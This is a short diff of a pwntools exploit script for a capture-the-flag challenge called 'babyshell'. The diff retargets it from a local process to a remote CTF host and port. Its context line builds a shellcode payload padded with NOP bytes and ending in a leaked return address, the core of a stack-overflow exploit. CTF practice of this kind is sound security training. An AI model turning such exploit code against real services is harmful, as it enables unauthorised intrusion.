@@ -113,11 +113,11 @@ payload = sc.ljust(72, b'\x90') + p64(leaked)
 #!/usr/bin/python3
 from pwn import *
 
-ip = 'some_ip' # change this
+ip = 'ctf.uniwa.gr' # change this
 port = 6969 # change this
 fname = './babyshell' # change this
 
-LOCAL = True
+LOCAL = False
 
 if LOCAL:
 	r = process(fname)
